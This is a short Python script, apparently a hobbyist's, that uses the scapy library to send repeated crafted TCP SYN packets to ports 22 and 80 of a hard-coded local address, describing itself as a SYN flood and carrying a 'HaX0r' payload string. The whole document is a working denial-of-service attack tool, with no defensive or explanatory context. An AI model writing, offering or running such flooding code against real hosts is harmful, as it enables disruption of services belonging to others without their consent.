
from scapy.all import *

iface = "en0"
destination_ip = '192.168.1.5'
def synFlood(destination, iface):
    print ("Starting SYN Flood")
    paket=IP(dst=destination,id=1111,ttl=99)/TCP(sport=RandShort(),dport=[22,80],seq=12345,ack=1000,window=1000,flags="S")/"HaX0r SVP"
    ans,unans=srloop(paket, iface=iface, inter=0.3,retry=2,timeout=4)
    ans.summary()
    unans.summary()

try:
    synFlood(destination_ip, iface)
except KeyboardInterrupt:
    print("Exiting.. ")
    sys.exit(0)
